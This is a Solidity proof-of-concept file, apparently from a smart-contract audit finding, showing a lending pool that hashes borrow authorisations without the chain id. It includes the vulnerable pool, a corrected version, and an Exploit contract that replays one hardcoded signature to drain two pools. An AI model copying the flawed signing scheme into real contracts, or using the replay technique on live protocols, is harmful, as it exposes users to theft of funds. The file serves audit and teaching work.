// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  RWA — H-01 (Kann Audits, 2025-01-19)
    borrowAsset and swapToBorrow hash the borrow without block.chainid.
    One signature draws 1,000 borrow tokens from chain A and again from chain B.
    A pool that appends block.chainid rejects that signature. */

contract Asset {
    string public symbol;
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BorrowPool {
    Asset public collateral;
    Asset public borrowToken;
    address public immutable borrower;
    mapping(address => uint256) public nonceOf;
    uint256 public drawn;

    constructor(Asset _collateral, Asset _borrowToken, address _borrower) {
        collateral = _collateral;
        borrowToken = _borrowToken;
        borrower = _borrower;
    }

    function borrowAsset(
        uint256 collatId,
        uint256 borrowId,
        uint256 collatAmt,
        uint256 borrowAmt,
        bytes32 r,
        bytes32 s,
        uint8 v
    ) external {
        _draw(collatId, borrowId, collatAmt, borrowAmt, r, s, v);
    }

    function swapToBorrow(
        uint256 collatId,
        uint256 borrowId,
        uint256 collatAmt,
        uint256 borrowAmt,
        bytes32 r,
        bytes32 s,
        uint8 v
    ) external {
        _draw(collatId, borrowId, collatAmt, borrowAmt, r, s, v);
    }

    function _draw(
        uint256 collatId,
        uint256 borrowId,
        uint256 collatAmt,
        uint256 borrowAmt,
        bytes32 r,
        bytes32 s,
        uint8 v
    ) internal {
        uint256 nonce = nonceOf[borrower];
        // @> VULN: chain id is not in the borrow hash, so this signature is valid on every chain
        bytes32 borrowHash = keccak256(abi.encode(collatId, borrowId, collatAmt, borrowAmt, borrower, nonce));
        // FIX: keccak256(abi.encode(collatId, borrowId, collatAmt, borrowAmt, borrower, nonce, block.chainid))
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", borrowHash));
        require(ecrecover(digest, v, r, s) == borrower, "signer");
        nonceOf[borrower] = nonce + 1;
        require(collateral.transferFrom(msg.sender, address(this), collatAmt), "collateral");
        require(borrowToken.transfer(borrower, borrowAmt), "borrow");
        drawn += borrowAmt;
    }
}

contract BorrowPoolFixed {
    Asset public collateral;
    Asset public borrowToken;
    address public immutable borrower;
    mapping(address => uint256) public nonceOf;

    constructor(Asset _collateral, Asset _borrowToken, address _borrower) {
        collateral = _collateral;
        borrowToken = _borrowToken;
        borrower = _borrower;
    }

    function borrowAsset(
        uint256 collatId,
        uint256 borrowId,
        uint256 collatAmt,
        uint256 borrowAmt,
        bytes32 r,
        bytes32 s,
        uint8 v
    ) external {
        uint256 nonce = nonceOf[borrower];
        bytes32 borrowHash =
            keccak256(abi.encode(collatId, borrowId, collatAmt, borrowAmt, borrower, nonce, block.chainid));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", borrowHash));
        require(ecrecover(digest, v, r, s) == borrower, "signer");
        nonceOf[borrower] = nonce + 1;
        require(collateral.transferFrom(msg.sender, address(this), collatAmt), "collateral");
        require(borrowToken.transfer(borrower, borrowAmt), "borrow");
    }
}

contract Exploit {
    address public constant BORROWER = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    bytes32 public constant SIG_R = 0xee875d85f304417cd1e368e1a559573bbca590466417e126bb778587bce511c5;
    bytes32 public constant SIG_S = 0x279203d98aef50262bde99b9fc89f8748abc81f7f1fd056a8aefe2e09bcf77c2;
    uint8 public constant SIG_V = 27;
    uint256 public constant COLLAT = 1500 ether;
    uint256 public constant BORROW = 1000 ether;

    Asset public collateral; // nonce 1
    Asset public borrowToken; // nonce 2
    BorrowPool public chainA; // nonce 3
    BorrowPool public chainB; // nonce 4

    constructor() {
        collateral = new Asset("COLL");
        borrowToken = new Asset("USDC");
        chainA = new BorrowPool(collateral, borrowToken, BORROWER);
        chainB = new BorrowPool(collateral, borrowToken, BORROWER);
        collateral.mint(address(this), COLLAT * 2);
        borrowToken.mint(address(chainA), BORROW);
        borrowToken.mint(address(chainB), BORROW);
        collateral.approve(address(chainA), COLLAT);
        collateral.approve(address(chainB), COLLAT);
    }

    function run() external {
        uint256 beforeBal = borrowToken.balanceOf(BORROWER);
        chainA.borrowAsset(1, 1, COLLAT, BORROW, SIG_R, SIG_S, SIG_V);
        chainB.swapToBorrow(1, 1, COLLAT, BORROW, SIG_R, SIG_S, SIG_V);
        require(borrowToken.balanceOf(BORROWER) - beforeBal == BORROW * 2, "both chains paid");
        require(chainA.drawn() == BORROW && chainB.drawn() == BORROW, "drawn");
        require(borrowToken.balanceOf(address(chainA)) == 0, "chain A empty");
        require(borrowToken.balanceOf(address(chainB)) == 0, "chain B empty");
    }
}
